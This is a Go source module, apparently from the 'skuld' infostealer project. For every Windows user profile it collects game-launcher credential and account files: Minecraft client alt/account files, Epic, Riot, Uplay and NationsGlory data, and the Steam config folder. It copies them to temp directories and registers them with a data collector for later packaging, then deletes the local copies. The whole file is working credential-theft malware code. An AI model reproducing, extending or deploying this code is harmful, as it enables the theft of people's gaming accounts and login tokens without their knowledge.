package games

import (
	"fmt"
	"github.com/hackirby/skuld/utils/fileutil"
	"github.com/hackirby/skuld/utils/hardware"
	"github.com/hackirby/skuld/utils/collector"
	"os"
	"path/filepath"
	"strings"
)

func Run(dataCollector *collector.DataCollector) {
	for _, user := range hardware.GetUsers() {
		paths := map[string]map[string]string{
			"Epic Games": {
				"Settings": filepath.Join(user, "AppData", "Local", "EpicGamesLauncher", "Saved", "Config", "Windows", "GameUserSettings.ini"),
			},
			"Minecraft": {
				"Intent":          filepath.Join(user, "intentlauncher", "launcherconfig"),
				"Lunar":           filepath.Join(user, ".lunarclient", "settings", "game", "accounts.json"),
				"TLauncher":       filepath.Join(user, "AppData", "Roaming", ".minecraft", "TlauncherProfiles.json"),
				"Feather":         filepath.Join(user, "AppData", "Roaming", ".feather", "accounts.json"),
				"Meteor":          filepath.Join(user, "AppData", "Roaming", ".minecraft", "meteor-client", "accounts.nbt"),
				"Impact":          filepath.Join(user, "AppData", "Roaming", ".minecraft", "Impact", "alts.json"),
				"Novoline":        filepath.Join(user, "AppData", "Roaming", ".minecraft", "Novoline", "alts.novo"),
				"CheatBreakers":   filepath.Join(user, "AppData", "Roaming", ".minecraft", "cheatbreaker_accounts.json"),
				"Microsoft Store": filepath.Join(user, "AppData", "Roaming", ".minecraft", "launcher_accounts_microsoft_store.json"),
				"Rise":            filepath.Join(user, "AppData", "Roaming", ".minecraft", "Rise", "alts.txt"),
				"Rise (Intent)":   filepath.Join(user, "intentlauncher", "Rise", "alts.txt"),
				"Paladium":        filepath.Join(user, "AppData", "Roaming", "paladium-group", "accounts.json"),
				"PolyMC":          filepath.Join(user, "AppData", "Roaming", "PolyMC", "accounts.json"),
				"Badlion":         filepath.Join(user, "AppData", "Roaming", "Badlion Client", "accounts.json"),
			},
			"Riot Games": {
				"Config": filepath.Join(user, "AppData", "Local", "Riot Games", "Riot Client", "Config"),
				"Data":   filepath.Join(user, "AppData", "Local", "Riot Games", "Riot Client", "Data"),
				"Logs":   filepath.Join(user, "AppData", "Local", "Riot Games", "Riot Client", "Logs"),
			},
			"Uplay": {
				"Settings": filepath.Join(user, "AppData", "Local", "Ubisoft Game Launcher"),
			},
			"NationsGlory": {
				"Local Storage": filepath.Join(user, "AppData", "Roaming", "NationsGlory", "Local Storage", "leveldb"),
			},
		}

		tempDir := filepath.Join(os.TempDir(), fmt.Sprintf("games-%s", strings.Split(user, "\\")[2]))
		found := ""
		for name, path := range paths {
			dest := filepath.Join(tempDir, strings.Split(user, "\\")[2], name)

			if err := os.MkdirAll(dest, os.ModePerm); err != nil {
				continue
			}

			var err error

			for fName, fPath := range path {
				if filepath.Ext(fPath) != "" {
					os.MkdirAll(filepath.Join(dest, fName), os.ModePerm)
					err = fileutil.CopyFile(fPath, filepath.Join(dest, fName, filepath.Base(fPath)))
				} else {
					err = fileutil.CopyDir(fPath, filepath.Join(dest, fName))
				}

				if err != nil {
					continue
				}

				if !strings.Contains(found, name) {
					found += fmt.Sprintf("\n✅ %s ", name)
				}
			}

		}

		if found == "" {
			os.RemoveAll(tempDir)
			continue
		}

		// Add games data to collector
		gamesInfo := map[string]interface{}{
			"User":       strings.Split(user, "\\")[2],
			"GamesFound": found,
		}
		dataCollector.AddData("games", gamesInfo)
		dataCollector.AddDirectory("games", tempDir, fmt.Sprintf("games_%s", strings.Split(user, "\\")[2]))

		os.RemoveAll(tempDir)
	}

	tempDir := fmt.Sprintf("%s\\%s", os.TempDir(), "steam-temp")
	defer os.RemoveAll(tempDir)

	path := "C:\\Program Files (x86)\\Steam\\config"
	if !fileutil.IsDir(path) {
		return
	}

	if err := fileutil.CopyDir(path, tempDir); err != nil {
		return
	}

	// Add Steam data to collector
	steamInfo := map[string]interface{}{
		"Status": "Steam config found and collected",
	}
	dataCollector.AddData("steam", steamInfo)
	dataCollector.AddDirectory("steam", tempDir, "steam_config")
}
